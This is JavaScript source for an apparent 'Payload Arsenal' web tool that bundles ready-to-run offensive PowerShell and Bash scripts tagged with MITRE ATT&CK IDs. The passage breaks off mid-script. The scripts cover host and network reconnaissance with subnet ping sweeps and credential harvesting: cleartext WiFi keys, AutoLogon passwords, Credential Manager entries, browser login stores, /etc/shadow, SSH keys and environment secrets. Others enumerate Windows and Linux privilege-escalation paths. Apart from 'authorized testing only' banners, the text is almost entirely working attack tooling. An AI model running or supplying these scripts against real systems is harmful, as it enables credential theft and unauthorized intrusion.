
// Advanced Payload Arsenal - Professional Cybersecurity Research Platform
// Developed by 0x0806
// Educational & Research Use Only

class PayloadArsenal {
    constructor() {
        this.version = '2.0.0';
        this.currentSection = 'system_info';
        this.currentTheme = localStorage.getItem('theme') || 'dark';
        this.searchTerm = '';
        this.activeFilters = {
            complexity: ['basic', 'intermediate', 'advanced', 'expert'],
            platform: ['windows', 'linux', 'unix', 'macos'],
            type: ['powershell', 'bash', 'cmd', 'python', 'c']
        };
        this.favorites = JSON.parse(localStorage.getItem('favorites') || '[]');
        this.payloadHistory = JSON.parse(localStorage.getItem('payloadHistory') || '[]');
        this.currentPayload = null;

        // Initialize payload database
        this.payloads = this.initializePayloads();
        this.init();
    }

    init() {
        try {
            this.showLoadingIndicator('Initializing platform...');
            this.setupEventListeners();
            this.loadSection('system_info');
            this.updateTheme();
            this.updateStats();
            this.initializeTabSwitching();
            this.hideLoadingIndicator();
            console.log('Payload Arsenal initialized successfully');
        } catch (error) {
            console.error('Initialization failed:', error);
            this.hideLoadingIndicator();
            this.showNotification('Platform failed to load. Please refresh.', 'error');
        }
    }

    initializePayloads() {
        return {
            // ===== SYSTEM INFORMATION =====
            windows_sysinfo: {
                command: `# Windows System Information Gathering
Write-Host "[*] Windows System Information Collection" -ForegroundColor Cyan

# Basic System Information
$computerInfo = Get-ComputerInfo
Write-Host "Computer Name: $($computerInfo.WindowsProductName)" -ForegroundColor Green
Write-Host "OS Version: $($computerInfo.WindowsVersion)" -ForegroundColor Green
Write-Host "Build Number: $($computerInfo.WindowsBuildLabEx)" -ForegroundColor Green
Write-Host "Domain: $($computerInfo.CsDomain)" -ForegroundColor Green
Write-Host "Username: $env:USERNAME" -ForegroundColor Green

# Hardware Information
Write-Host "\`n[+] Hardware Information:" -ForegroundColor Yellow
Get-WmiObject Win32_Processor | Select-Object Name, Architecture, NumberOfCores | Format-List
Get-WmiObject Win32_PhysicalMemory | Measure-Object Capacity -Sum | ForEach-Object { 
    Write-Host "Total RAM: $([math]::Round($_.Sum / 1GB, 2)) GB" -ForegroundColor Cyan 
}

# Network Configuration
Write-Host "\`n[+] Network Configuration:" -ForegroundColor Yellow
Get-NetIPConfiguration | Where-Object { $_.NetAdapter.Status -eq "Up" } | ForEach-Object {
    Write-Host "Interface: $($_.InterfaceAlias)" -ForegroundColor Magenta
    Write-Host "IPv4: $($_.IPv4Address.IPAddress)" -ForegroundColor Magenta
    Write-Host "Gateway: $($_.IPv4DefaultGateway.NextHop)" -ForegroundColor Magenta
    Write-Host "DNS: $($_.DNSServer.ServerAddresses -join ', ')" -ForegroundColor Magenta
}

# Running Processes
Write-Host "\`n[+] Top Processes by CPU:" -ForegroundColor Yellow
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 | Format-Table Name, Id, CPU, WorkingSet -AutoSize

# Installed Software
Write-Host "\`n[+] Recently Installed Software:" -ForegroundColor Yellow
Get-WmiObject Win32_Product | Sort-Object InstallDate -Descending | Select-Object -First 10 | Format-Table Name, Version, InstallDate -AutoSize

# Security Information
Write-Host "\`n[+] Security Information:" -ForegroundColor Yellow
$antivirus = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct -ErrorAction SilentlyContinue
if ($antivirus) {
    $antivirus | ForEach-Object { Write-Host "Antivirus: $($_.displayName)" -ForegroundColor Red }
}

# Windows Defender Status
$defenderStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
if ($defenderStatus) {
    Write-Host "Windows Defender Real-time Protection: $($defenderStatus.RealTimeProtectionEnabled)" -ForegroundColor Red
    Write-Host "Windows Defender Antivirus Enabled: $($defenderStatus.AntivirusEnabled)" -ForegroundColor Red
}`,
                description: "Comprehensive Windows system information gathering including hardware, network, security, and software details.",
                complexity: "basic",
                platform: "windows",
                type: "powershell",
                category: "System Information",
                tags: ["reconnaissance", "system-info", "network", "security"],
                mitre_id: "T1082"
            },

            linux_sysinfo: {
                command: `#!/bin/bash
# Linux System Information Gathering
echo -e "\\033[1;32m[*] Linux System Information Collection\\033[0m"

# Basic System Information
echo -e "\\n\\033[1;34m[+] System Information:\\033[0m"
echo "Hostname: $(hostname -f)"
echo "Kernel: $(uname -a)"
echo "Distribution: $(lsb_release -d 2>/dev/null | cut -f2 || cat /etc/*release 2>/dev/null | grep PRETTY_NAME | cut -d'=' -f2 | tr -d '\"')"
echo "Architecture: $(uname -m)"
echo "Uptime: $(uptime -p 2>/dev/null || uptime)"

# Current User Information
echo -e "\\n\\033[1;34m[+] Current User Information:\\033[0m"
echo "User: $(whoami)"
echo "UID/GID: $(id)"
echo "Groups: $(groups)"
echo "Shell: $SHELL"
echo "Home Directory: $HOME"

# Hardware Information
echo -e "\\n\\033[1;34m[+] Hardware Information:\\033[0m"
echo "CPU: $(lscpu | grep 'Model name' | cut -d':' -f2 | xargs)"
echo "CPU Cores: $(nproc)"
echo "Memory: $(free -h | grep '^Mem:' | awk '{print $2}')"
echo "Disk Usage: $(df -h / | tail -1 | awk '{print $3"/"$2" ("$5" used)"}')"

# Network Configuration
echo -e "\\n\\033[1;34m[+] Network Configuration:\\033[0m"
ip addr show 2>/dev/null | grep -E "inet |link/" | head -20

# Running Processes
echo -e "\\n\\033[1;34m[+] Top Processes by CPU:\\033[0m"
ps aux --sort=-%cpu | head -11

# Listening Services
echo -e "\\n\\033[1;34m[+] Listening Services:\\033[0m"
netstat -tlnp 2>/dev/null | grep LISTEN | head -10

# Environment Variables
echo -e "\\n\\033[1;34m[+] Important Environment Variables:\\033[0m"
env | grep -E "(PATH|HOME|USER|SHELL|TERM)" | head -10

# Installed Packages (Debian/Ubuntu)
if command -v dpkg >/dev/null 2>&1; then
    echo -e "\\n\\033[1;34m[+] Recently Installed Packages (Debian/Ubuntu):\\033[0m"
    grep " install " /var/log/dpkg.log 2>/dev/null | tail -10 | awk '{print $4}' | sort -u
fi

# Installed Packages (RedHat/CentOS)
if command -v rpm >/dev/null 2>&1; then
    echo -e "\\n\\033[1;34m[+] Recently Installed Packages (RedHat/CentOS):\\033[0m"
    rpm -qa --last | head -10
fi

# Cron Jobs
echo -e "\\n\\033[1;34m[+] Cron Jobs:\\033[0m"
crontab -l 2>/dev/null || echo "No user crontab"
ls -la /etc/cron* 2>/dev/null | head -10

# File System Information
echo -e "\\n\\033[1;34m[+] File System Mounts:\\033[0m"
mount | grep -E "(ext|xfs|btrfs|zfs)" | head -10

echo -e "\\n\\033[1;32m[*] System Information Collection Complete\\033[0m"`,
                description: "Comprehensive Linux system information gathering including hardware, network, processes, and configuration details.",
                complexity: "basic",
                platform: "linux",
                type: "bash",
                category: "System Information",
                tags: ["reconnaissance", "linux", "system-info", "enumeration"],
                mitre_id: "T1082"
            },

            unix_sysinfo: {
                command: `#!/bin/sh
# Unix System Information Gathering (POSIX Compatible)
printf "\\033[1;32m[*] Unix System Information Collection\\033[0m\\n"

# Basic System Information
printf "\\n\\033[1;34m[+] System Information:\\033[0m\\n"
printf "Hostname: %s\\n" "$(hostname)"
printf "Kernel: %s\\n" "$(uname -a)"
printf "Operating System: %s\\n" "$(uname -s)"
printf "Architecture: %s\\n" "$(uname -m)"

# Current User Information
printf "\\n\\033[1;34m[+] User Information:\\033[0m\\n"
printf "User: %s\\n" "$(whoami)"
printf "UID: %s\\n" "$(id -u)"
printf "GID: %s\\n" "$(id -g)"
printf "Groups: %s\\n" "$(id -G)"
printf "Shell: %s\\n" "$SHELL"

# Process Information
printf "\\n\\033[1;34m[+] Process Information:\\033[0m\\n"
ps aux | head -11

# Network Information
printf "\\n\\033[1;34m[+] Network Information:\\033[0m\\n"
netstat -an | grep LISTEN | head -10

# File System Information
printf "\\n\\033[1;34m[+] File System Information:\\033[0m\\n"
df -h 2>/dev/null | head -10

# Environment Variables
printf "\\n\\033[1;34m[+] Environment Variables:\\033[0m\\n"
env | head -20

# System Limits
printf "\\n\\033[1;34m[+] System Limits:\\033[0m\\n"
ulimit -a

# Last Logins
printf "\\n\\033[1;34m[+] Recent Logins:\\033[0m\\n"
last | head -10 2>/dev/null || printf "No login information available\\n"

# System Load
printf "\\n\\033[1;34m[+] System Load:\\033[0m\\n"
uptime 2>/dev/null || printf "Uptime information not available\\n"

printf "\\n\\033[1;32m[*] Unix System Information Collection Complete\\033[0m\\n"`,
                description: "POSIX-compatible Unix system information gathering script for maximum compatibility across Unix variants.",
                complexity: "basic",
                platform: "unix",
                type: "bash",
                category: "System Information",
                tags: ["reconnaissance", "unix", "posix", "system-info"],
                mitre_id: "T1082"
            },

            windows_network_recon: {
                command: `# Windows Network Reconnaissance
Write-Host "[*] Windows Network Reconnaissance" -ForegroundColor Cyan

# Network Configuration
Write-Host "\`n[+] Network Interfaces:" -ForegroundColor Yellow
Get-NetAdapter | Where-Object Status -eq "Up" | Format-Table Name, InterfaceDescription, LinkSpeed, Status -AutoSize

# ARP Table
Write-Host "\`n[+] ARP Table:" -ForegroundColor Yellow
Get-NetNeighbor | Where-Object State -ne "Unreachable" | Format-Table IPAddress, LinkLayerAddress, State, InterfaceAlias -AutoSize

# Routing Table
Write-Host "\`n[+] Routing Table:" -ForegroundColor Yellow
Get-NetRoute | Where-Object DestinationPrefix -ne "ff00::/8" | Sort-Object RouteMetric | Format-Table DestinationPrefix, NextHop, RouteMetric, InterfaceAlias -AutoSize

# Active Network Connections
Write-Host "\`n[+] Active Network Connections:" -ForegroundColor Yellow
Get-NetTCPConnection | Where-Object State -eq "Established" | Format-Table LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess -AutoSize

# Listening Ports
Write-Host "\`n[+] Listening Ports:" -ForegroundColor Yellow
Get-NetTCPConnection | Where-Object State -eq "Listen" | Format-Table LocalAddress, LocalPort, OwningProcess -AutoSize
Get-NetUDPEndpoint | Format-Table LocalAddress, LocalPort, OwningProcess -AutoSize

# DNS Configuration
Write-Host "\`n[+] DNS Configuration:" -ForegroundColor Yellow
Get-DnsClientServerAddress | Format-Table InterfaceAlias, ServerAddresses -AutoSize

# Network Shares
Write-Host "\`n[+] Network Shares:" -ForegroundColor Yellow
Get-SmbShare | Format-Table Name, Path, Description -AutoSize

# WiFi Profiles
Write-Host "\`n[+] WiFi Profiles:" -ForegroundColor Yellow
netsh wlan show profiles | Select-String "All User Profile"

# Network Discovery
Write-Host "\`n[+] Network Discovery (Ping Sweep):" -ForegroundColor Yellow
$subnet = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null }).IPv4Address.IPAddress
$networkBase = $subnet.Substring(0, $subnet.LastIndexOf('.'))
Write-Host "Scanning subnet: $networkBase.0/24" -ForegroundColor Green

1..254 | ForEach-Object -Parallel {
    $ip = "$using:networkBase.$_"
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet -TimeoutSeconds 1) {
        Write-Host "Host alive: $ip" -ForegroundColor Green
    }
} -ThrottleLimit 50

Write-Host "\`n[*] Network Reconnaissance Complete" -ForegroundColor Cyan`,
                description: "Comprehensive Windows network reconnaissance including interface enumeration, ARP discovery, and network scanning.",
                complexity: "intermediate",
                platform: "windows",
                type: "powershell",
                category: "Network Reconnaissance",
                tags: ["network", "discovery", "scanning", "enumeration"],
                mitre_id: "T1018"
            },

            linux_network_recon: {
                command: `#!/bin/bash
# Linux Network Reconnaissance
echo -e "\\033[1;32m[*] Linux Network Reconnaissance\\033[0m"

# Network Interfaces
echo -e "\\n\\033[1;34m[+] Network Interfaces:\\033[0m"
ip addr show

# Network Routes
echo -e "\\n\\033[1;34m[+] Routing Table:\\033[0m"
ip route show

# ARP Table
echo -e "\\n\\033[1;34m[+] ARP Table:\\033[0m"
arp -a 2>/dev/null || ip neigh show

# Active Connections
echo -e "\\n\\033[1;34m[+] Active Network Connections:\\033[0m"
netstat -tuln 2>/dev/null || ss -tuln

# Listening Services
echo -e "\\n\\033[1;34m[+] Listening Services:\\033[0m"
netstat -tlnp 2>/dev/null || ss -tlnp

# DNS Configuration
echo -e "\\n\\033[1;34m[+] DNS Configuration:\\033[0m"
cat /etc/resolv.conf

# Network Statistics
echo -e "\\n\\033[1;34m[+] Network Statistics:\\033[0m"
netstat -s 2>/dev/null | head -20

# WiFi Networks (if available)
echo -e "\\n\\033[1;34m[+] WiFi Networks:\\033[0m"
if command -v iwlist >/dev/null 2>&1; then
    iwlist scan 2>/dev/null | grep ESSID | head -10
elif command -v nmcli >/dev/null 2>&1; then
    nmcli dev wifi list 2>/dev/null | head -10
else
    echo "No WiFi scanning tools available"
fi

# Network Discovery
echo -e "\\n\\033[1;34m[+] Network Discovery:\\033[0m"
gateway=$(ip route | grep default | awk '{print $3}' | head -1)
if [ -n "$gateway" ]; then
    network=$(echo $gateway | cut -d'.' -f1-3)
    echo "Scanning network: $network.0/24"
    
    # Ping sweep
    for i in {1..254}; do
        ping -c 1 -W 1 "$network.$i" >/dev/null 2>&1 && echo "Host alive: $network.$i" &
    done
    wait
fi

# Network Interfaces Details
echo -e "\\n\\033[1;34m[+] Network Interface Details:\\033[0m"
for interface in $(ip link show | grep -E "^[0-9]" | awk -F': ' '{print $2}'); do
    echo "Interface: $interface"
    ethtool "$interface" 2>/dev/null | grep -E "(Speed|Link)" || echo "  Details not available"
done

# Firewall Status
echo -e "\\n\\033[1;34m[+] Firewall Status:\\033[0m"
if command -v ufw >/dev/null 2>&1; then
    ufw status
elif command -v iptables >/dev/null 2>&1; then
    iptables -L | head -20
else
    echo "No firewall tools found"
fi

echo -e "\\n\\033[1;32m[*] Network Reconnaissance Complete\\033[0m"`,
                description: "Comprehensive Linux network reconnaissance including interface enumeration, service discovery, and network scanning.",
                complexity: "intermediate",
                platform: "linux",
                type: "bash",
                category: "Network Reconnaissance",
                tags: ["network", "linux", "discovery", "scanning"],
                mitre_id: "T1018"
            },

            windows_credential_dump: {
                command: `# Windows Credential Harvesting
Write-Host "[*] Windows Credential Harvesting (Authorized Testing Only)" -ForegroundColor Red

# Check for AutoLogon credentials
Write-Host "\`n[+] Checking AutoLogon Registry:" -ForegroundColor Yellow
try {
    $autologon = Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" -ErrorAction Stop
    if ($autologon.DefaultPassword) {
        Write-Host "AutoLogon Found!" -ForegroundColor Red
        Write-Host "Username: $($autologon.DefaultUserName)" -ForegroundColor Yellow
        Write-Host "Password: $($autologon.DefaultPassword)" -ForegroundColor Yellow
        Write-Host "Domain: $($autologon.DefaultDomainName)" -ForegroundColor Yellow
    } else {
        Write-Host "No AutoLogon credentials found" -ForegroundColor Green
    }
} catch {
    Write-Host "Cannot access AutoLogon registry" -ForegroundColor Red
}

# Saved Windows Credentials
Write-Host "\`n[+] Windows Credential Manager:" -ForegroundColor Yellow
cmdkey /list

# WiFi Passwords
Write-Host "\`n[+] WiFi Passwords:" -ForegroundColor Yellow
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ':')[1].Trim() }
foreach ($profile in $profiles) {
    Write-Host "Checking profile: $profile" -ForegroundColor Cyan
    $password = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content"
    if ($password) {
        Write-Host "Network: $profile" -ForegroundColor Yellow
        Write-Host "Password: $($password -split ':')[1].Trim()" -ForegroundColor Red
    } else {
        Write-Host "No password stored for $profile" -ForegroundColor Green
    }
}

# Browser Credential Locations
Write-Host "\`n[+] Browser Credential Database Locations:" -ForegroundColor Yellow
$locations = @(
    "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data",
    "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Web Data",
    "$env:APPDATA\\Mozilla\\Firefox\\Profiles",
    "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data",
    "$env:LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"
)

foreach ($location in $locations) {
    if (Test-Path $location) {
        Write-Host "Found: $location" -ForegroundColor Yellow
        $file = Get-Item $location
        Write-Host "Size: $($file.Length) bytes, Modified: $($file.LastWriteTime)" -ForegroundColor Cyan
    }
}

# Recently Used Documents
Write-Host "\`n[+] Recent Documents:" -ForegroundColor Yellow
Get-ChildItem "$env:APPDATA\\Microsoft\\Windows\\Recent" -Force | Select-Object Name, LastWriteTime | Sort-Object LastWriteTime -Descending | Select-Object -First 10

# Saved RDP Connections
Write-Host "\`n[+] Saved RDP Connections:" -ForegroundColor Yellow
try {
    $rdp = Get-ItemProperty "HKCU:\\Software\\Microsoft\\Terminal Server Client\\Default" -ErrorAction Stop
    $rdp.PSObject.Properties | Where-Object { $_.Name -match "MRU" } | ForEach-Object {
        Write-Host "RDP Connection: $($_.Value)" -ForegroundColor Cyan
    }
} catch {
    Write-Host "No saved RDP connections found" -ForegroundColor Green
}

# PowerShell History
Write-Host "\`n[+] PowerShell Command History:" -ForegroundColor Yellow
$historyPath = "$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
if (Test-Path $historyPath) {
    Write-Host "History file found: $historyPath" -ForegroundColor Yellow
    Get-Content $historyPath | Select-Object -Last 10
} else {
    Write-Host "No PowerShell history found" -ForegroundColor Green
}

# Cached Domain Credentials
Write-Host "\`n[+] Cached Domain Information:" -ForegroundColor Yellow
try {
    $domain = Get-WmiObject Win32_ComputerSystem | Select-Object Domain, PartOfDomain
    Write-Host "Domain: $($domain.Domain)" -ForegroundColor Cyan
    Write-Host "Part of Domain: $($domain.PartOfDomain)" -ForegroundColor Cyan
} catch {
    Write-Host "Cannot retrieve domain information" -ForegroundColor Red
}

Write-Host "\`n[WARNING] This information is for authorized security testing only!" -ForegroundColor Red
Write-Host "[WARNING] Unauthorized credential harvesting is illegal!" -ForegroundColor Red`,
                description: "Windows credential harvesting techniques for authorized security testing and penetration testing.",
                complexity: "advanced",
                platform: "windows",
                type: "powershell",
                category: "Credential Access",
                tags: ["credentials", "passwords", "wifi", "browser", "registry"],
                mitre_id: "T1003"
            },

            linux_credential_dump: {
                command: `#!/bin/bash
# Linux Credential Harvesting
echo -e "\\033[1;31m[*] Linux Credential Harvesting (Authorized Testing Only)\\033[0m"

# Shadow File Check
echo -e "\\n\\033[1;34m[+] Shadow File Access:\\033[0m"
if [ -r /etc/shadow ]; then
    echo -e "\\033[1;31m[!] Can read /etc/shadow file\\033[0m"
    head -5 /etc/shadow
else
    echo "Cannot read /etc/shadow (normal)"
fi

# Passwd File
echo -e "\\n\\033[1;34m[+] User Accounts:\\033[0m"
cat /etc/passwd | grep -E "(bash|sh)$" | head -10

# SSH Keys
echo -e "\\n\\033[1;34m[+] SSH Keys:\\033[0m"
find /home -name "*.pub" -o -name "id_*" 2>/dev/null | head -10
if [ -d ~/.ssh ]; then
    echo "SSH directory found: ~/.ssh"
    ls -la ~/.ssh/ 2>/dev/null
fi

# History Files
echo -e "\\n\\033[1;34m[+] Command History Files:\\033[0m"
find /home -name ".*_history" 2>/dev/null | head -10
if [ -f ~/.bash_history ]; then
    echo "Recent bash history:"
    tail -10 ~/.bash_history 2>/dev/null
fi

# Environment Variables with Potential Secrets
echo -e "\\n\\033[1;34m[+] Environment Variables (Potential Secrets):\\033[0m"
env | grep -i -E "(password|secret|key|token|api)" | head -10

# Configuration Files with Potential Credentials
echo -e "\\n\\033[1;34m[+] Configuration Files with Potential Credentials:\\033[0m"
find /home /etc -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | xargs grep -l -i "password\\|secret\\|key" 2>/dev/null | head -10

# MySQL Configuration
echo -e "\\n\\033[1;34m[+] MySQL Configuration:\\033[0m"
if [ -f /etc/mysql/my.cnf ]; then
    echo "Found MySQL config: /etc/mysql/my.cnf"
    grep -E "(user|password)" /etc/mysql/my.cnf 2>/dev/null
fi

# Apache/Nginx Configuration
echo -e "\\n\\033[1;34m[+] Web Server Configuration:\\033[0m"
find /etc -name "*.conf" 2>/dev/null | xargs grep -l -i "password" 2>/dev/null | head -5

# Browser Data (if accessible)
echo -e "\\n\\033[1;34m[+] Browser Data Locations:\\033[0m"
find /home -path "*/.mozilla/firefox/*/logins.json" 2>/dev/null | head -5
find /home -path "*/.config/google-chrome/*/Login Data" 2>/dev/null | head -5

# Crontab Files
echo -e "\\n\\033[1;34m[+] Crontab Files:\\033[0m"
find /var/spool/cron -type f 2>/dev/null | head -5
ls -la /etc/cron* 2>/dev/null | head -10

# Recently Modified Files
echo -e "\\n\\033[1;34m[+] Recently Modified Files (last 24 hours):\\033[0m"
find /home -type f -mtime -1 2>/dev/null | head -10

# Sudo Configuration
echo -e "\\n\\033[1;34m[+] Sudo Configuration:\\033[0m"
if [ -r /etc/sudoers ]; then
    echo "Can read /etc/sudoers:"
    grep -v "^#" /etc/sudoers | grep -v "^$" | head -10
else
    sudo -l 2>/dev/null || echo "Cannot check sudo privileges"
fi

# Network Configuration
echo -e "\\n\\033[1;34m[+] Network Configuration Files:\\033[0m"
find /etc -name "*network*" -o -name "*wifi*" -o -name "*wpa*" 2>/dev/null | head -10

echo -e "\\n\\033[1;31m[WARNING] This information is for authorized security testing only!\\033[0m"
echo -e "\\033[1;31m[WARNING] Unauthorized credential harvesting is illegal!\\033[0m"`,
                description: "Linux credential harvesting techniques for authorized security testing including file enumeration and configuration analysis.",
                complexity: "advanced",
                platform: "linux",
                type: "bash",
                category: "Credential Access",
                tags: ["credentials", "linux", "ssh-keys", "configuration", "history"],
                mitre_id: "T1003"
            },

            windows_privesc_enum: {
                command: `# Windows Privilege Escalation Enumeration
Write-Host "[*] Windows Privilege Escalation Enumeration" -ForegroundColor Cyan

# Current User Privileges
Write-Host "\`n[+] Current User Privileges:" -ForegroundColor Yellow
whoami /all

# Check if running as Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
Write-Host "Running as Administrator: $isAdmin" -ForegroundColor $(if($isAdmin){"Green"}else{"Red"})

# System Information
Write-Host "\`n[+] System Information:" -ForegroundColor Yellow
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix"

# Unquoted Service Paths
Write-Host "\`n[+] Unquoted Service Paths:" -ForegroundColor Yellow
Get-WmiObject -Class Win32_Service | Where-Object { 
    $_.PathName -and 
    $_.PathName -notmatch '^".*"$' -and 
    $_.PathName -match ' ' -and
    $_.PathName -notmatch '^[A-Z]:\\\\Windows\\\\'
} | Select-Object Name, DisplayName, PathName, StartMode, State | Format-Table -AutoSize

# Writable Service Binaries
Write-Host "\`n[+] Potentially Writable Service Binaries:" -ForegroundColor Yellow
Get-WmiObject -Class Win32_Service | ForEach-Object {
    if ($_.PathName -match '"([^"]+)"') {
        $path = $matches[1]
    } else {
        $path = $_.PathName.Split(' ')[0]
    }
    
    if (Test-Path $path) {
        try {
            $acl = Get-Acl $path -ErrorAction Stop
            $writeAccess = $acl.Access | Where-Object { 
                $_.FileSystemRights -match "Write|FullControl" -and 
                $_.AccessControlType -eq "Allow" -and
                ($_.IdentityReference -match "Everyone|Users|Authenticated Users")
            }
            if ($writeAccess) {
                Write-Host "Writable service binary: $($_.Name) - $path" -ForegroundColor Red
            }
        } catch {}
    }
}

# AlwaysInstallElevated Registry Check
Write-Host "\`n[+] AlwaysInstallElevated Registry Check:" -ForegroundColor Yellow
$hklm = Get-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
$hkcu = Get-ItemProperty "HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
if ($hklm.AlwaysInstallElevated -eq 1 -and $hkcu.AlwaysInstallElevated -eq 1) {
    Write-Host "AlwaysInstallElevated is ENABLED! MSI packages run as SYSTEM." -ForegroundColor Red
} else {
    Write-Host "AlwaysInstallElevated is not enabled" -ForegroundColor Green
}

# Scheduled Tasks
Write-Host "\`n[+] Interesting Scheduled Tasks:" -ForegroundColor Yellow
Get-ScheduledTask | Where-Object { 
    $_.Principal.UserId -eq "SYSTEM" -and 
    $_.State -eq "Ready" 
} | Select-Object TaskName, TaskPath, @{Name="Actions";Expression={$_.Actions.Execute}} | Format-Table -AutoSize

# Installed Software
Write-Host "\`n[+] Potentially Vulnerable Software:" -ForegroundColor Yellow
Get-WmiObject -Class Win32_Product | Where-Object { 
    $_.Name -match "Adobe|Java|Flash|Reader" 
} | Select-Object Name, Version | Format-Table -AutoSize

# Registry AutoRuns
Write-Host "\`n[+] Registry AutoRun Entries:" -ForegroundColor Yellow
$autorunKeys = @(
    "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
    "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
)

foreach ($key in $autorunKeys) {
    Write-Host "Checking: $key" -ForegroundColor Cyan
    try {
        $items = Get-ItemProperty -Path $key -ErrorAction Stop
        $items.PSObject.Properties | Where-Object { $_.Name -notmatch "^PS" } | ForEach-Object {
            Write-Host "  $($_.Name): $($_.Value)" -ForegroundColor White
        }
    } catch {
        Write-Host "  Cannot access or empty" -ForegroundColor Gray
    }
}

# DLL Hijacking Opportunities
Write-Host "\`n[+] Potential DLL Hijacking Opportunities:" -ForegroundColor Yellow
$systemPath = $env:PATH -split ';'
foreach ($path in $systemPath) {
    if (Test-Path $path) {
        try {
            $acl = Get-Acl $path -ErrorAction Stop
            $writeAccess = $acl.Access | Where-Object { 
                $_.FileSystemRights -match "Write|FullControl" -and 
                $_.AccessControlType -eq "Allow" -and
                $_.IdentityReference -match "Everyone|Users|Authenticated Users"
            }
            if ($writeAccess) {
                Write-Host "Writable PATH directory: $path" -ForegroundColor Red
            }
        } catch {}
    }
}

# Windows Version and Patch Level
Write-Host "\`n[+] Windows Version and Patches:" -ForegroundColor Yellow
$osInfo = Get-WmiObject Win32_OperatingSystem
Write-Host "OS: $($osInfo.Caption)" -ForegroundColor Cyan
Write-Host "Version: $($osInfo.Version)" -ForegroundColor Cyan
Write-Host "Build: $($osInfo.BuildNumber)" -ForegroundColor Cyan

# Recent Hotfixes
Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 5 | Format-Table HotFixID, Description, InstalledOn -AutoSize

Write-Host "\`n[*] Privilege Escalation Enumeration Complete" -ForegroundColor Cyan`,
                description: "Comprehensive Windows privilege escalation enumeration identifying potential attack vectors and misconfigurations.",
                complexity: "advanced",
                platform: "windows",
                type: "powershell",
                category: "Privilege Escalation",
                tags: ["privilege-escalation", "services", "registry", "unquoted-paths"],
                mitre_id: "T1068"
            },

            linux_privesc_enum: {
                command: `#!/bin/bash
# Linux Privilege Escalation Enumeration
echo -e "\\033[1;31m[*] Linux Privilege Escalation Enumeration\\033[0m"

# Current User Information
echo -e "\\n\\033[1;34m[+] Current User Information:\\033[0m"
echo "User: $(whoami)"
echo "Groups: $(groups)"
echo "UID/GID: $(id)"

# Sudo Privileges
echo -e "\\n\\033[1;34m[+] Sudo Privileges:\\033[0m"
sudo -l 2>/dev/null || echo "Cannot check sudo privileges"

# SUID/SGID Binaries
echo -e "\\n\\033[1;34m[+] SUID/SGID Binaries:\\033[0m"
find / -type f \\( -perm -4000 -o -perm -2000 \\) 2>/dev/null | while read file; do
    echo "Found: $file"
    # Check if it's a known GTFOBins binary
    basename_file=$(basename "$file")
    case "$basename_file" in
        "nmap"|"vim"|"nano"|"less"|"more"|"man"|"awk"|"find"|"xargs"|"perl"|"python"|"python3"|"ruby"|"node"|"docker")
            echo -e "\\033[1;31m  [!] Potential GTFOBins escalation vector: $basename_file\\033[0m"
            ;;
    esac
done

# World Writable Directories
echo -e "\\n\\033[1;34m[+] World Writable Directories:\\033[0m"
find / -type d -perm -002 2>/dev/null | grep -v proc | head -20

# World Writable Files
echo -e "\\n\\033[1;34m[+] World Writable Files:\\033[0m"
find / -type f -perm -002 2>/dev/null | head -20

# Files with No Owner
echo -e "\\n\\033[1;34m[+] Files with No Owner:\\033[0m"
find / -nouser -o -nogroup 2>/dev/null | head -20

# Kernel Version and Exploits
echo -e "\\n\\033[1;34m[+] Kernel Information:\\033[0m"
uname -a
kernel_version=$(uname -r)
echo "Kernel Version: $kernel_version"

# Check for known vulnerable kernels
echo -e "\\n\\033[1;34m[+] Known Kernel Vulnerabilities:\\033[0m"
case "$kernel_version" in
    *"3.13."*)
        echo -e "\\033[1;31m[!] Potentially vulnerable to CVE-2014-0038 (recvmmsg)\\033[0m"
        ;;
    *"4.4."*|*"4.5."*)
        echo -e "\\033[1;31m[!] Potentially vulnerable to CVE-2017-16995 (eBPF)\\033[0m"
        ;;
    *"2.6."*)
        echo -e "\\033[1;31m[!] Very old kernel - multiple known vulnerabilities\\033[0m"
        ;;
esac

# Capabilities
echo -e "\\n\\033[1;34m[+] File Capabilities:\\033[0m"
getcap -r / 2>/dev/null | head -20

# Cron Jobs
echo -e "\\n\\033[1;34m[+] Cron Jobs Analysis:\\033[0m"
echo "System crontab:"
cat /etc/crontab 2>/dev/null
echo "Cron directories:"
ls -la /etc/cron* 2>/dev/null

# Writable Service Files
echo -e "\\n\\033[1;34m[+] Writable Service Files:\\033[0m"
find /etc/systemd/system /lib/systemd/system -writable 2>/dev/null | head -10

# Environment Variables
echo -e "\\n\\033[1;34m[+] Environment Analysis:\\033[0m"
echo "PATH: $PATH"
echo "LD_PRELOAD: $LD_PRELOAD"
echo "LD_LIBRARY_PATH: $LD_LIBRARY_PATH"

# Check for writable directories in PATH
